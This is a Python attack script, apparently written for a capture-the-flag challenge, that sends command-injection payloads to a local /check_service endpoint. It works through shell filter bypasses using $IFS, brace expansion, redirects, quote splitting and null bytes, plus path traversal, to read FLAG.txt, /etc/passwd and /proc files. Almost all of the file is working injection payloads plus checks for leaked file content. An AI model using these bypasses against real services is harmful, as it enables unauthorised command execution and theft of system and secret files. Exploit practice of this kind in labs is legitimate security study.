import requests
import base64

base_url = "http://127.0.0.1:32972"
endpoint = "/check_service"
url = f"{base_url}{endpoint}"

def test_payload(payload, technique):
    """Test a single payload and return full response"""
    try:
        resp = requests.post(url, json={"service_name": payload}, timeout=10)
        return {
            "technique": technique,
            "payload": payload,
            "status": resp.status_code,
            "response": resp.text,
            "content_length": len(resp.content)
        }
    except Exception as e:
        return {
            "technique": technique,
            "payload": payload,
            "error": str(e)
        }

print("=" * 70)
print("REFINED TESTING - Looking for actual command output in responses")
print("=" * 70)

# First, explore what works to get command output
print("\n[1] Testing if any command returns actual output (not just status)")
basic_tests = [
    "ls", "ls -la", "cat /etc/passwd", "cat/etc/passwd",
    "echo test", "head /etc/passwd"
]

for cmd in basic_tests:
    result = test_payload(cmd, f"basic_{cmd.replace(' ', '_')}")
    print(f"\nCommand: {cmd}")
    print(f"Response: {result['response']}")
    print(f"Content Length: {result['content_length']}")

print("\n" + "=" * 70)
print("[2] Testing path traversal with file reading")
print("=" * 70)

# Testing various file paths
traversal_tests = [
    ("cat<../FLAG.txt", "traverse_up_flag"),
    ("cat<../../FLAG.txt", "traverse_up2_flag"),
    ("cat<../../../FLAG.txt", "traverse_up3_flag"),
    ("cat</tmp/FLAG.txt", "tmp_flag"),
    ("cat</app/FLAG.txt", "app_flag"),
    ("cat<./FLAG.txt", "current_dir_flag"),
    ("cat<././FLAG.txt", "current_dot_flag"),
    ("cat<...//...//FLAG.txt", "weird_traverse"),
]

for payload, tech in traversal_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Response: {result['response']}")
    if 'flag' in result['response'].lower() or 'FLAG' in result['response']:
        print("!!! FLAG CONTENT FOUND !!!")

print("\n" + "=" * 70)
print("[3] Testing alternative file reading methods")
print("=" * 70)

alt_read_tests = [
    ("grep . FLAG.txt", "grep_cat"),
    ("grep." + "FLAG.txt", "grep_nospace"),
    ("more<FLAG.txt", "more_redirect"),
    ("less<FLAG.txt", "less_redirect"),
    ("tail<FLAG.txt", "tail_redirect"),
    ("head-1<FLAG.txt", "head_redirect"),
    ("sort<FLAG.txt", "sort_redirect"),
    ("uniq<FLAG.txt", "uniq_redirect"),
]

for payload, tech in alt_read_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Response: {result['response']}")

print("\n" + "=" * 70)
print("[4] Testing shell variables and special expansions")
print("=" * 70)

shell_tests = [
    ("cat$IFS</FLAG.txt", "cat_ifs_redirect"),
    ("cat</FLAG.txt$IFS", "cat_redirect_ifs"),
    ('cat$IFS<"FLAG.txt"', "cat_ifs_quoted"),
    ("cat</\"FLAG.txt\"", "cat_redirect_double_quoted"),
    ("cat<'FLAG.txt'", "cat_redirect_single_quoted"),
    ("cat</'FLAG.txt'", "cat_redirect_single_root"),
]

for payload, tech in shell_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")

print("\n" + "=" * 70)
print("[5] Testing combined bypass techniques")
print("=" * 70)

combined_tests = [
    ("{cat,../FLAG.txt}", "brace_parent"),
    ("{cat,<,FLAG.txt}", "brace_redirect"),
    ("{cat,<,/FLAG.txt}", "brace_redirect_root"),
    ("cat${IFS}</FLAG.txt", "cat_ifs_redirect_root"),
    ("cat$IFS</FLAG.txt", "cat_ifs_nobrace_redirect"),
]

for payload, tech in combined_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")

print("\n" + "=" * 70)
print("[6] Testing with control characters and unusual encodings")
print("=" * 70)

encoding_tests = [
    ("cat</FLAG.txt;", "redirect_semicolon"),
    ("cat</FLAG.txt#", "redirect_hash"),
    ("cat</FLAG.txt//", "redirect_doubleslash"),
    ("cat</FLAG.txt/", "redirect_trailingslash"),
    ('cat</FLAG.txt\x00', "redirect_null"),
    ("cat</FLAG.txt\t", "redirect_tab"),
]

for payload, tech in encoding_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {repr(payload)}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")

print("\n" + "=" * 70)
print("[7] Checking for command execution in different contexts")
print("=" * 70)

context_tests = [
    ("ls-la", "ls_nospace"),
    ("cat-FLAG.txt", "cat_nospace"),
    ("cat</etc/passwd", "redirect_etc"),
    ("cat</proc/self/cmdline", "redirect_proc_cmdline"),
    ("cat</proc/version", "redirect_proc_version"),
]

for payload, tech in context_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")
    # Look for output patterns that might indicate actual file content
    resp_lower = result['response'].lower()
    if any(x in resp_lower for x in ['root:', 'flag{', 'flag=', 'bin:', 'sys:', 'version']):
        print(f"!!! POTENTIAL FILE CONTENT: {result['response']}")

print("\n" + "=" * 70)
print("[8] Testing various quote and escape combinations")
print("=" * 70)

quote_tests = [
    ('cat</"FLAG"".txt"', "split_quote_double"),
    ("cat</'FLAG'.txt", "split_quote_single"),
    ('cat</F"LAG".txt', "inline_quote"),
    ("cat</FLAG.\"txt\"", "ext_quote"),
    ('"cat"</FLAG.txt', "cmd_quote"),
    ("'cat'</FLAG.txt", "cmd_quote_single"),
]

for payload, tech in quote_tests:
    result = test_payload(payload, tech)
    print(f"\n[{tech}] Payload: {payload}")
    print(f"Status: {result['status']}")
    print(f"Response: {result['response']}")

